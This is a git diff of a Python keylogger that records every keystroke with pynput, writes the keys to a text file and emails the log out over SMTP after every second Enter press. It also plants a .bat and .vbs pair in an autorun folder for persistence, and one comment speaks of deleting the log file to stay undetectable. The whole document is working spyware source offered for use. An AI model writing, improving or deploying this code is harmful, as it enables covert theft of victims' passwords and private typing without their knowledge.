@@ -1,22 +1,25 @@
 import os.path
 from pynput import keyboard
 import smtplib, ssl
-from email.message import EmailMessage              #This are all the libraries we need.
+from email.message import EmailMessage
 from os import remove
 import sys
 import getpass
 
 
-path_txt_teclado = 'key_logger.txt'             #Here we define the path where is going to be the txt file with all the keys that are pressed.
+path_txt_teclado = 'key_logger.txt'             #Here we define the path where is going to be the txt file with all de keys that are pressed.
 
 sender = ''
 reciver = ''            #You must fill this variable with the sender email, reciver email and the email password.
 password = ''
 
 count = 0
-f = open(path_txt_teclado , 'w')        #Creation of the txt that I mentioned before. It'll be deleted instantly to be undetectable.
-f.close()
-f = open(path_txt_teclado , 'r')
+
+def open_txt():
+    global f
+    f = open(path_txt_teclado , 'w')        #Creation of the txt that I mentioned before.
+    f.close()
+    f = open(path_txt_teclado , 'r')
 
 #Esta funcion nos dice las teclas que hemos presionado
 
@@ -32,7 +35,7 @@ def on_press(key):
     except:
         print(' La tecla {} fue presionada '.format(key))
         f = open(path_txt_teclado,'a')
-        if key == 'Key.backspace':   
+        if key == 'Key.backspace':
             f.write('%BORRAR%')                                 #The same but it runs if the key pressed is a special key like a backspace.
             f.write('\n')
         elif key == 'Key.space':
@@ -41,7 +44,7 @@ def on_press(key):
 
         if key == key.enter:
             count += 1
-            if count == 2:                  # If the Enter key is pressed 2 times, the function that sends the email will be called.
+            if count % 2 == 0:                  # Each 2 times the Enter key is pressed, the function that sends the email will be called.
                 send_email(sender , reciver , password)
 
 
@@ -75,7 +78,7 @@ def send_email(sender,reciver, password):
     server.quit()
 
 
-#Function that makes a .bat file that will be run by a vbs file which is save in a path that runs all the files it contains when Windows is iniciated.
+#Function that makes a .bat file that will be run by a vbs file which is save in a path that runs all the files it contains.
 
 def move_file():
     user_name = getpass.getuser()
@@ -96,6 +99,13 @@ def move_file():
 #Finally we call all the needed functions.
 
 if __name__ == '__main__':
+    open_txt()
     move_file()
     read_pressed_keys()
     remove(path_txt_teclado)
+    
+    while count < 10:
+        print(count)
+        open_txt()                      # It will be runing until the Enter key is pressed 9 times.
+        read_pressed_keys()
+        remove(path_txt_teclado)
